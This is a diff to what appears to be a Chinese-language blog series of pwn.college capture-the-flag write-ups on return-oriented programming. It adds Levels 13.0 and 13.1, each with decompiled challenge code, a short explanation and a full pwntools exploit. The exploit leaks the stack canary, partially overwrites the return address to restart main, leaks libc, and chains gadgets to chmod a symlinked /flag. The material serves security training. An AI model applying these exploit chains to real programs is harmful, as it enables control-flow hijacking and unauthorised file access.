@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-22 17:55"
+modDate: "2025-01-23 14:58"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -4193,3 +4193,442 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{4358dHEnXGJJC945avk1i2By5c6.0FN2MDL5cTNxgzW}`
+
+## Level 13.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform ROP when the function has a canary!
+
+### Write-up
+
+```c ins={52, 56-58} del={59} collapse={1-48, 63-67}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+0h] [rbp-A0h] BYREF
+  const char **v5; // [rsp+8h] [rbp-98h]
+  const char **v6; // [rsp+10h] [rbp-90h]
+  int v7; // [rsp+1Ch] [rbp-84h]
+  int v8; // [rsp+28h] [rbp-78h]
+  int v9; // [rsp+2Ch] [rbp-74h]
+  const void *v10[3]; // [rsp+30h] [rbp-70h] BYREF
+  __int64 v11; // [rsp+48h] [rbp-58h]
+  _BYTE buf[72]; // [rsp+50h] [rbp-50h] BYREF
+  unsigned __int64 v13; // [rsp+98h] [rbp-8h]
+  __int64 savedregs; // [rsp+A0h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+A8h] [rbp+8h] BYREF
+
+  v7 = argc;
+  v6 = argv;
+  v5 = envp;
+  v13 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  v8 = argc;
+  v10[1] = argv;
+  v10[2] = v5;
+  puts(
+    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
+  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
+  sp_ = (__int64)&v4;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v4) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts(
+    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
+  puts(
+    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
+  puts(
+    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
+  puts(
+    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
+  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
+  puts("ASLR means that the address of the stack is not known,");
+  puts("but I will simulate a memory disclosure of it.");
+  puts("By knowing where the stack is, you can now reference data");
+  puts("that you write onto the stack.");
+  puts("Be careful: this data could trip up your ROP chain,");
+  puts("because it could be interpreted as return addresses.");
+  puts("You can use gadgets that shift the stack appropriately to avoid that.");
+  printf("[LEAK] Your input buffer is located at: %p.\n\n", buf);
+  puts("This will simulate an 8-byte arbitrary read.");
+  v10[0] = 0LL;
+  puts("Address in hex to read from:");
+  __isoc99_scanf("%p", v10);
+  v11 = *(_QWORD *)v10[0];
+  printf("[LEAK] *%p = 0x%016llx\n\n", v10[0], v11);
+  v9 = read(0, buf, 0x1000uLL);
+  printf("Received %d bytes! This is potentially %d gadgets.\n", v9, (unsigned __int64)&buf[v9 - rp_] >> 3);
+  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
+  puts("from within this challenge. You will have to do that by yourself.");
+  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v9 - rp_] >> 3) + 1);
+  puts("Leaving!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+这题不难吧，标绿部分模拟了一个泄漏，我们可以通过它把 canary 泄漏出来。之后我们想办法返回到 `__libc_start_main` 再次调用 `main` 函数，泄漏一个 `libc` 地址出来，计算 `libc` 基址，有了基址就可以去构造 ROP Chain 了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level13.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *main+770
+c
+"""
+
+CANARY_OFFSET = 0x48
+RET_OFFSET = 0x58
+LIBC_OFFSET = 0x24083
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def leak(target, offset, info_type):
+    target.recvuntil(b"located at: ")
+    leaked_addr = int(target.recvline().rstrip(b".\n"), 16) + offset
+
+    target.sendline(hex(leaked_addr).encode("ascii"))
+    target.recvuntil(b"[LEAK]")
+
+    if info_type == "canary":
+        return int(target.recvline()[21:], 16)
+    elif info_type == "libc_base":
+        return int(target.recvline()[21:], 16)
+    else:
+        log.error(b"Invalid info type!")
+
+
+def construct_payload(stage, canary, libc_base=None):
+    if stage == 1:
+        __libc_start_main_fixed_low_byte = b"\x90"
+        __libc_start_main_high_byte_candidates = [
+            p8(i) for i in range(0x0F, 0x10F, 0x10)
+        ]
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            __libc_start_main_fixed_low_byte
+            + random.choice(__libc_start_main_high_byte_candidates),
+        )
+    elif stage == 2:
+        if libc_base is None:
+            log.failure("libc_base is required for stage 2!")
+            exit()
+
+        local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+        local_libc.address = libc_base - LIBC_OFFSET
+
+        rop = ROP(local_libc)
+
+        pop_rdi_ret = rop.rdi.address
+        pop_rsi_ret = rop.rsi.address
+
+        filename = next(local_libc.search(b"GNU"))
+        mode = 0o4
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_ret,
+            mode,
+            local_libc.symbols["chmod"],
+        )
+    else:
+        log.error(b"Invalid stage number!")
+
+
+def attack(target):
+    try:
+        os.system("ln -s /flag GNU")
+
+        leaked_canary = leak(target, CANARY_OFFSET, "canary")
+        payload = construct_payload(1, leaked_canary)
+
+        target.send(payload)
+
+        try:
+            response = target.recvuntil(b"Welcome to (null)!", timeout=0.1)
+
+            if b"Welcome to (null)!" in response:
+                payload = construct_payload(
+                    2, leaked_canary, leak(target, RET_OFFSET, "libc_base")
+                )
+
+                target.send(payload)
+        except Exception as e:
+            log.failure(f"String not detected in this turn. {e}")
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as f:
+                log.success(f.read())
+            return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        target = None
+
+        try:
+            target = launch(debug=False)
+
+            if attack(target):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+        finally:
+            if target is not None:
+                target.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{Mw9zt3eeAB8_8it-_3_NRUzoHRA.0VN2MDL5cTNxgzW}`
+
+## Level 13.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform ROP when the function has a canary!
+
+### Write-up
+
+参见 [Level 13.0](#level-130)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level13.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+CANARY_OFFSET = 0x78
+RET_OFFSET = 0x88
+LIBC_OFFSET = 0x24083
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def leak(target, offset, info_type):
+    target.recvuntil(b"located at: ")
+    leaked_addr = int(target.recvline().rstrip(b".\n"), 16) + offset
+
+    target.sendline(hex(leaked_addr).encode("ascii"))
+    target.recvuntil(b"[LEAK]")
+
+    if info_type == "canary":
+        return int(target.recvline()[21:], 16)
+    elif info_type == "libc_base":
+        return int(target.recvline()[21:], 16)
+    else:
+        log.error(b"Invalid info type!")
+
+
+def construct_payload(stage, canary, libc_base=None):
+    if stage == 1:
+        __libc_start_main_fixed_low_byte = b"\x90"
+        __libc_start_main_high_byte_candidates = [
+            p8(i) for i in range(0x0F, 0x10F, 0x10)
+        ]
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            __libc_start_main_fixed_low_byte
+            + random.choice(__libc_start_main_high_byte_candidates),
+        )
+    elif stage == 2:
+        if libc_base is None:
+            log.failure("libc_base is required for stage 2!")
+            exit()
+
+        local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+        local_libc.address = libc_base - LIBC_OFFSET
+
+        rop = ROP(local_libc)
+
+        pop_rdi_ret = rop.rdi.address
+        pop_rsi_ret = rop.rsi.address
+
+        filename = next(local_libc.search(b"GNU"))
+        mode = 0o4
+
+        return flat(
+            b"".ljust(CANARY_OFFSET, b"A"),
+            canary,
+            b"".ljust(0x8, b"A"),
+            pop_rdi_ret,
+            filename,
+            pop_rsi_ret,
+            mode,
+            local_libc.symbols["chmod"],
+        )
+    else:
+        log.error(b"Invalid stage number!")
+
+
+def attack(target):
+    try:
+        os.system("ln -s /flag GNU")
+
+        leaked_canary = leak(target, CANARY_OFFSET, "canary")
+        payload = construct_payload(1, leaked_canary)
+
+        target.send(payload)
+
+        try:
+            response = target.recvuntil(b"Welcome to (null)!", timeout=0.1)
+
+            if b"Welcome to (null)!" in response:
+                payload = construct_payload(
+                    2, leaked_canary, leak(target, RET_OFFSET, "libc_base")
+                )
+
+                target.send(payload)
+        except Exception as e:
+            log.failure(f"String not detected in this turn. {e}")
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as f:
+                log.success(f.read())
+            return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        target = None
+
+        try:
+            target = launch(debug=False)
+
+            if attack(target):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+        finally:
+            if target is not None:
+                target.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{M-9WLFPzOoEolY4qgzOfZ2Xk3JW.0lN2MDL5cTNxgzW}`
